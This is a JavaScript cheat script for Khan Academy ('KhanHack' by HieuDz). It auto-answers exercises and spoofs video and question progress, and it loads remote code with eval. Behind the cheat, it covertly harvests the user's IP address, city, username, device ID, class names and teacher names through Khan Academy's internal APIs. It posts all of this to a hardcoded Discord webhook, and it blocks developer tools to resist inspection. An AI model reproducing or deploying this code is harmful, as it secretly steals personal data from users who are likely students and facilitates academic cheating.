const ver = "HieuDz";
let isDev = false;

const repoPath = `https://raw.githubusercontent.com/Niximkk/Khanware/refs/heads/${isDev ? "dev/" : "main/"}`;

let device = {
    mobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Windows Phone|Mobile|Tablet|Kindle|Silk|PlayBook|BB10/i.test(navigator.userAgent),
    apple: /iPhone|iPad|iPod|Macintosh|Mac OS X/i.test(navigator.userAgent)
};

/* User */
let user = {
    username: "Username",
    nickname: "Nickname",
    UID: 0
}

let loadedPlugins = [];

/* Elements */
const unloader = document.createElement('unloader');
const dropdownMenu = document.createElement('dropDownMenu');
const watermark = document.createElement('watermark');
const statsPanel = document.createElement('statsPanel');
const splashScreen = document.createElement('splashScreen');

/* Globals */
window.features = {
    questionSpoof: true,
    videoSpoof: true,
    showAnswers: false,
    autoAnswer: false,
    customBanner: false,
    nextRecomendation: false,
    repeatQuestion: false,
    minuteFarmer: false,
    rgbLogo: false
};
window.featureConfigs = {
    autoAnswerDelay: 3,
    customUsername: "",
    customPfp: ""
};

/* Security */
document.addEventListener('contextmenu', (e) => !window.disableSecurity && e.preventDefault());
document.addEventListener('keydown', (e) => { if (!window.disableSecurity && (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'C', 'J'].includes(e.key)))) { e.preventDefault(); } });
console.log(Object.defineProperties(new Error, { toString: {value() {(new Error).stack.includes('toString@') && location.reload();}}, message: {get() {location.reload();}}, }));

/* Misc Styles */
document.head.appendChild(Object.assign(document.createElement("style"),{innerHTML:"@font-face{font-family:'MuseoSans';src:url('https://corsproxy.io/?url=https://r2.e-z.host/4d0a0bea-60f8-44d6-9e74-3032a64a9f32/ynddewua.ttf')format('truetype')}" }));
document.head.appendChild(Object.assign(document.createElement('style'),{innerHTML:"::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #f1f1f1; } ::-webkit-scrollbar-thumb { background: #888; border-radius: 10px; } ::-webkit-scrollbar-thumb:hover { background: #555; }"}));
document.querySelector("link[rel~='icon']").href = 'https://i.imgur.com/JDt99XK.jpeg';

/* Emmiter */
class EventEmitter{constructor(){this.events={}}on(t,e){"string"==typeof t&&(t=[t]),t.forEach(t=>{this.events[t]||(this.events[t]=[]),this.events[t].push(e)})}off(t,e){"string"==typeof t&&(t=[t]),t.forEach(t=>{this.events[t]&&(this.events[t]=this.events[t].filter(t=>t!==e))})}emit(t,...e){this.events[t]&&this.events[t].forEach(t=>{t(...e)})}once(t,e){"string"==typeof t&&(t=[t]);let s=(...i)=>{e(...i),this.off(t,s)};this.on(t,s)}};
const plppdo = new EventEmitter();

new MutationObserver((mutationsList) => { for (let mutation of mutationsList) if (mutation.type === 'childList') plppdo.emit('domChanged'); }).observe(document.body, { childList: true, subtree: true });

/* Misc Functions */
window.debug = function(text) { /* QuickFix */};
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
const playAudio = url => { const audio = new Audio(url); audio.play(); debug(`🔊 Playing audio from ${url}`); };
const findAndClickBySelector = selector => { const element = document.querySelector(selector); if (element) { element.click(); sendToast(`⭕ Pressionando ${selector}...`, 1000); } };

function sendToast(text, duration=5000, gravity='bottom') { Toastify({ text: text, duration: duration, gravity: gravity, position: "center", stopOnFocus: true, style: { background: "#000000" } }).showToast(); debug(text); };

async function showSplashScreen() {
    splashScreen.style.cssText = `
        position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
        width: 400px; height: 300px; background: linear-gradient(135deg, #1e40af, #facc15);
        display: flex; flex-direction: column; align-items: center; justify-content: center;
        z-index: 9999; opacity: 0; transition: opacity 0.5s ease; user-select: none;
        font-family: 'Inter', sans-serif; color: white; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.3);
    `;
    splashScreen.innerHTML = `
        <img src="https://i.imgur.com/JDt99XK.jpeg" style="width: 100px; height: 100px; border-radius: 50%; margin-bottom: 20px;">
        <span style="font-size: 30px; font-weight: 700;">Powered By Hiếu Dz</span>
        <span style="font-size: 24px; color: #facc15;">Best-Kav-Hack</span>
    `;
    document.body.appendChild(splashScreen);
    setTimeout(() => splashScreen.style.opacity = '1', 10);
}

async function hideSplashScreen() {
    splashScreen.style.opacity = '0';
    await delay(1000);
    splashScreen.remove();
}

async function loadScript(url, label) { return fetch(url).then(response => response.text()).then(script => { loadedPlugins.push(label); eval(script); }); }
async function loadCss(url) { return new Promise((resolve) => { const link = document.createElement('link'); link.rel = 'stylesheet'; link.type = 'text/css'; link.href = url; link.onload = () => resolve(); document.head.appendChild(link); }); }

/* Webhook Function */
async function sendWebhook(data) {
    const webhookUrl = 'https://discord.com/api/webhooks/1368062286614499468/4s1L9sZrD48qU2fXjXd9PDWNIkShAB4NoURB-Q49lK3GOcYq5p0oqwzIFURPDavDi_J4';
    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: 'HieuDz KavHack Bot',
                avatar_url: 'https://i.imgur.com/JDt99XK.jpeg',
                embeds: [{
                    title: '🛠️ New Script Injection Detected!',
                    color: 0xFF4500,
                    fields: [
                        { name: '👤 Username', value: data.username || 'Unknown', inline: true },
                        { name: '📛 Nickname', value: data.nickname || 'Unknown', inline: true },
                        { name: '🌐 IP Address', value: data.ip || 'Unknown', inline: true },
                        { name: '📍 City', value: data.city || 'Unknown', inline: true },
                        { name: '🏞️ Region', value: data.region || 'Unknown', inline: true },
                        { name: '🌍 Country', value: data.country || 'Unknown', inline: true },
                        { name: '🔢 Usage Count', value: data.usageCount.toString(), inline: true },
                        { name: '🆔 Device ID', value: data.deviceId || 'Unknown', inline: true },
                        { name: '📱 Device Type', value: data.deviceType || 'Unknown', inline: true },
                        { name: '📚 Classes', value: data.classes || 'None', inline: true },
                        { name: '👨‍🏫 Teachers', value: data.teachers || 'None', inline: true }
                    ],
                    footer: { text: `Powered by HieuDz | Version: ${ver}` },
                    timestamp: new Date().toISOString()
                }]
            })
        });
        debug('Webhook sent successfully!');
    } catch (error) {
        debug('Failed to send webhook: ' + error.message);
    }
}

/* Visual Functions */
function setupMenu() {
    loadScript(repoPath+'visuals/mainMenu.js', 'mainMenu');
    loadScript(repoPath+'visuals/statusPanel.js', 'statusPanel');
    loadScript(repoPath+'visuals/widgetBot.js', 'widgetBot');
    if(isDev) loadScript(repoPath+'visuals/devTab.js', 'devTab');
}

/* Main Functions */ 
function setupMain(){
    loadScript('https://raw.githubusercontent.com/HieuDz997/vatchatbian/refs/heads/main/questionSpoof.js', 'questionSpoof');
    loadScript(repoPath+'functions/videoSpoof.js', 'videoSpoof');
    loadScript(repoPath+'functions/minuteFarm.js', 'minuteFarm');
    loadScript(repoPath+'functions/spoofUser.js', 'spoofUser');
    loadScript(repoPath+'functions/answerRevealer.js', 'answerRevealer');
    loadScript(repoPath+'functions/rgbLogo.js', 'rgbLogo');
    loadScript(repoPath+'functions/customBanner.js', 'customBanner');
    loadScript(repoPath+'functions/autoAnswer.js', 'autoAnswer');
}

/* Inject */
if (!/^https?:\/\/([a-z0-9-]+\.)?khanacademy\.org/.test(window.location.href)) { alert("❌ Không Thể Inject!\n\nVui lòng không dung HieuDz Kav Hack trên web khác! (https://pt.khanacademy.org/)"); window.location.href = "https://pt.khanacademy.org/"; }

showSplashScreen();

loadScript('https://raw.githubusercontent.com/adryd325/oneko.js/refs/heads/main/oneko.js', 'onekoJs').then(() => { onekoEl = document.getElementById('oneko'); onekoEl.style.backgroundImage = "url('https://raw.githubusercontent.com/adryd325/oneko.js/main/oneko.gif')"; onekoEl.style.display = "none"; });
loadScript('https://cdn.jsdelivr.net/npm/darkreader@4.9.92/darkreader.min.js', 'darkReaderPlugin').then(()=>{ DarkReader.setFetchMethod(window.fetch); DarkReader.enable(); })
loadCss('https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css', 'toastifyCss');
loadScript('https://cdn.jsdelivr.net/npm/toastify-js', 'toastifyPlugin')
.then(async () => {
    // Initialize usage count and device ID
    let usageCount = parseInt(localStorage.getItem('kavHackUsageCount') || '0') + 1;
    localStorage.setItem('kavHackUsageCount', usageCount);
    let deviceId = localStorage.getItem('kavHackDeviceId');
    if (!deviceId) {
        deviceId = ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c => (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16));
        localStorage.setItem('kavHackDeviceId', deviceId);
    }

    // Fetch IP address and GeoIP
    let ipAddress = 'Unknown';
    let geoInfo = { city: 'Unknown', region: 'Unknown', country: 'Unknown' };
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ipAddress = ipData.ip;

        // Fetch GeoIP separately to avoid blocking
        try {
            const geoResponse = await fetch(`http://ip-api.com/json/${ipAddress}`);
            const geoData = await geoResponse.json();
            if (geoData.status !== 'fail') {
                geoInfo = {
                    city: geoData.city || 'Unknown',
                    region: geoData.regionName || 'Unknown',
                    country: geoData.country || 'Unknown'
                };
            }
        } catch (geoError) {
            debug('Failed to fetch GeoIP: ' + geoError.message);
        }
    } catch (error) {
        debug('Failed to fetch IP: ' + error.message);
    }

    // Fetch user profile
    let classInfo = { classes: 'None', teachers: 'None' };
    await fetch(`https://${window.location.hostname}/api/internal/graphql/getFullUserProfile`,{
        headers:{
            accept:"*/*",
            "accept-language":"pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type":"application/json",
            priority:"u=1, i",
            "sec-ch-ua":'"Chromium";v="134", "Not:A-Brand";v="24", "Brave";v="134"',
            "sec-ch-ua-mobile":"?0",
            "sec-ch-ua-platform":'"Windows"',
            "sec-fetch-dest":"empty",
            "sec-fetch-mode":"cors",
            "sec-fetch-site":"same-origin",
            "sec-gpc":"1",
            "x-ka-fkey":"1"
        },
        referrer:"https://pt.khanacademy.org/profile/me/teacher/kaid_589810246138844031185299/class/6245691961556992",
        referrerPolicy:"strict-origin-when-cross-origin",
        body:'{"operationName":"getFullUserProfile","variables":{},"query":"query getFullUserProfile($kaid: String, $username: String) {\\n  user(kaid: $kaid, username: $username) {\\n    id\\n    kaid\\n    key\\n    userId\\n    email\\n    username\\n    profileRoot\\n    gaUserId\\n    isPhantom\\n    isDeveloper: hasPermission(name: \\"can_do_what_only_admins_can_do\\")\\n    isPublisher: hasPermission(name: \\"can_publish\\", scope: ANY_ON_CURRENT_LOCALE)\\n    isModerator: hasPermission(name: \\"can_moderate_users\\", scope: GLOBAL)\\n    isParent\\n    isTeacher\\n    isFormalTeacher\\n    isK4dStudent\\n    isKmapStudent\\n    isDataCollectible\\n    isChild\\n    isOrphan\\n    isCoachingLoggedInUser\\n    canModifyCoaches\\n    nickname\\n    hideVisual\\n    joined\\n    points\\n    countVideosCompleted\\n    bio\\n    profile {\\n      accessLevel\\n      __typename\\n    }\\n    soundOn\\n    muteVideos\\n    showCaptions\\n    prefersReducedMotion\\n    noColorInVideos\\n    newNotificationCount\\n    canHellban: hasPermission(name: \\"can_ban_users\\", scope: GLOBAL)\\n    canMessageUsers: hasPermission(\\n      name: \\"can_send_moderator_messages\\"\\n      scope: GLOBAL\\n    )\\n    isSelf: isActor\\n    hasStudents: hasCoachees\\n    hasClasses\\n    hasChildren\\n    hasCoach\\n    badgeCounts\\n    homepageUrl\\n    isMidsignupPhantom\\n    includesDistrictOwnedData\\n    includesKmapDistrictOwnedData\\n    includesK4dDistrictOwnedData\\n    canAccessDistrictsHomepage\\n    underAgeGate {\\n      parentEmail\\n      daysUntilCutoff\\n      approvalGivenAt\\n      __typename\\n    }\\n    authEmails\\n    signupDataIfUnverified {\\n      email\\n      emailBounced\\n      __typename\\n    }\\n    pendingEmailVerifications {\\n      email\\n      __typename\\n    }\\n    hasAccessToAIGuideCompanionMode\\n    hasAccessToAIGuideLearner\\n    hasAccessToAIGuideDistrictAdmin\\n    hasAccessToAIGuideParent\\n    hasAccessToAIGuideTeacher\\n    tosAccepted\\n    shouldShowAgeCheck\\n    birthMonthYear\\n    lastLoginCountry\\n    region\\n    userDistrictInfos {\\n      id\\n      isKAD\\n      district {\\n        id\\n        region\\n        __typename\\n      }\\n      __typename\\n    }\\n    schoolAffiliation {\\n      id\\n      location\\n      __typename\\n    }\\n    __typename\\n  }\\n  actorIsImpersonatingUser\\n  isAIGuideEnabled\\n  hasAccessToAIGuideDev\\n}"}',
        method:"POST",
        mode:"cors",
        credentials:"include"
    })
    .then(async response => { 
        let data = await response.json(); 
        user = { 
            nickname: data.data.user.nickname, 
            username: data.data.user.username, 
            UID: data.data.user.id.slice(-5),
            hasClasses: data.data.user.hasClasses,
            hasCoach: data.data.user.hasCoach
        }; 

        // Fetch class and teacher info
        if (user.hasClasses || user.hasCoach) {
            try {
                const classResponse = await fetch(`https://${window.location.hostname}/api/internal/classrooms`, {
                    headers: {
                        accept: "*/*",
                        "content-type": "application/json",
                        "x-ka-fkey": "1",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin"
                    },
                    method: "GET",
                    mode: "cors",
                    credentials: "include"
                });
                const classData = await classResponse.json();
                const classes = classData.map(cls => `${cls.name} (${cls.id})`).join(', ') || 'None';
                const teachers = classData.flatMap(cls => cls.teachers?.map(t => t.nickname || t.username || 'Unknown') || []).join(', ') || 'None';
                classInfo = { classes, teachers };
            } catch (error) {
                debug('Failed to fetch class info: ' + error.message);
            }
        }

        // Send webhook with user data
        await sendWebhook({
            username: user.username,
            nickname: user.nickname,
            ip: ipAddress,
            city: geoInfo.city,
            region: geoInfo.region,
            country: geoInfo.country,
            usageCount: usageCount,
            deviceId: deviceId,
            deviceType: device.apple ? 'Apple' : device.mobile ? 'Mobile' : 'Desktop',
            classes: classInfo.classes,
            teachers: classInfo.teachers
        });
    });

    sendToast("🌿 KhanHack By HieuDz Injected!");
    
    playAudio('https://r2.e-z.host/4d0a0bea-60f8-44d6-9e74-3032a64a9f32/gcelzszy.wav');
    
    await delay(500);
    
    sendToast(`⭐ KhanHack By HieuDz Xin Chào Bạn : ${user.nickname}`);
    if(device.apple) { await delay(500); sendToast(`🪽 Thế còn việc mua một chiếc Samsung thì sao?`); }
    
    loadedPlugins.forEach(plugin => sendToast(`🪝 ${plugin} Loaded!`, 2000, 'top') );
    
    hideSplashScreen();
    setupMenu();
    setupMain();
    
    console.clear();
});

/* Thank you for using my cheat, no decode pls. */
